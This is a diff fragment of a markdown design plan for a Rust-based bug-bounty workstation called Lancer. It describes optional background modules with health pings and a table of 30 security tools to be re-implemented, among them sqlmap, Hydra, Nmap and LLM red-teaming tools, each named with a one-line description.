+```
+
+If the child stops answering pings within N seconds → main marks it Failed, optionally auto-restarts based on per-module policy.
+
+### Why this beats the alternatives
+
+- **vs Cargo feature flags**: those need recompile to toggle. Modules toggle live.
+- **vs hardcoded "always-on"**: ours uses zero RAM when off. Theirs uses RAM regardless.
+- **vs "remove the feature"**: ours keeps the capability one click away; nothing is lost.
+- **vs dynamic libraries (dylib)**: subprocess gives crash isolation AND clean OS reclamation; dylib still loads libpython into Lancer's address space.
+- **vs Burp's monolithic "everything on by default" approach**: Lancer competes on idle footprint.
+
+### Future modules (room to grow)
+
+The registry pattern allows any feature with significant idle cost to be added later without disturbing the GUI:
+
+- `headless-browser-pool` — pre-warmed Chromium pool for fast `chromiumoxide` ops (saves spawn cost, costs RAM)
+- `template-watcher` — background watcher reloading nuclei templates on change
+- `crawl-daemon` — continuous passive crawl
+- `webhook-notifier` — Discord/Slack push for high-severity findings
+- `mobile-adb` — keep `adb-server` alive in background for fast mobile ops
+
+Each one ships with `state = "off"` by default. The user decides what consumes their RAM.
+
+---
+
+## The 30-Tool Separate Clone Set
+
+All 30 are at `./19/<toolname>/plan.md` (folder name kept as `19/` for backwards compat). Each is a standalone project — Rust where practical, Go where the original is Go, Python where the domain demands it (symbolic execution, ML).
 
 | # | Tool | Domain | Folder |
 |---|---|---|---|
@@ -159,8 +635,19 @@ All 19 are at `./19/<toolname>/plan.md`. Each is a standalone project — Rust w
 | 17 | Ghidra | Binary decompiler | `19/ghidra/` |
 | 18 | Promptfoo | LLM red teaming | `19/promptfoo/` |
 | 19 | Strix | Autonomous AI hackbot | `19/strix/` |
+| 20 | jadx | Android APK → Java/Kotlin decompiler | `19/jadx/` |
+| 21 | APKTool | APK decode/rebuild/smali toolchain | `19/apktool/` |
+| 22 | Slither | Solidity static analysis (industry-standard) | `19/slither/` |
+| 23 | Nmap | Port + service + NSE scripting (beyond naabu) | `19/nmap/` |
+| 24 | Wireshark | L2/L3 packet capture + protocol dissection | `19/wireshark/` |
+| 25 | SpiderFoot | OSINT automation framework (200+ modules) | `19/spiderfoot/` |
+| 26 | sqlmap | SQL injection exploitation / DB takeover | `19/sqlmap/` |
+| 27 | Hydra | Network login brute-force (SSH/FTP/SMB/POP3/etc.) | `19/hydra/` |
+| 28 | Semgrep | General-language SAST (rules across 30+ langs) | `19/semgrep/` |
+| 29 | Agentic Radar | Agentic AI workflow security scanner | `19/agentic-radar/` |
+| 30 | ModelScan | ML model file (pickle/H5) supply-chain scanner | `19/modelscan/` |
 
-Together, Lancer + the 19 clones = a complete 2026 AI-era bug bounty workstation, all built by you with Claude Code.
+Together, Lancer + the 30 clones = a complete 2026 AI-era bug bounty workstation, all built by you with Claude Code.
 
 ## EVERY TINY BURP FEATURE — granular inventory (2026-05-24)
 
